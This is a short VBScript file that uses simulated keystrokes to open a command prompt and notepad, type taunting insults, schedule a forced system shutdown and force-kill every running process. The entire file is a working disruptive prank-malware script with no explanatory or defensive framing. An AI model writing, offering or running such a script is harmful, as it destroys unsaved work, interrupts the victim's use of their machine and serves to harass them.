Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Set x = CreateObject("WScript.Shell")

x.SendKeys "^{ESC}"
WScript.Sleep(1000)

x.SendKeys "cmd"
WScript.Sleep(500)
x.SendKeys "{ENTER}"
WScript.Sleep(1000)

x.SendKeys "notepad.exe"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(2000)

x.SendKeys "You are completly Fucked now..."
WScript.Sleep(2000)
x.SendKeys "{ENTER}"
WScript.Sleep(300)

x.SendKeys "HAHAHAHAHAHAHAHAHA"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(100)


x.SendKeys "^{ESC}"
WScript.Sleep(400)

x.SendKeys "cmd"
WScript.Sleep(500)
x.SendKeys "{ENTER}"
WScript.Sleep(1000)

x.SendKeys "shutdown /s /t 100 /c ""Your are an Idiot xaxaxaxaxaxa"""
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(100)


x.SendKeys "taskkill /F /FI ""STATUS eq RUNNING"""
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(100)

x.SendKeys "exit"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(100)
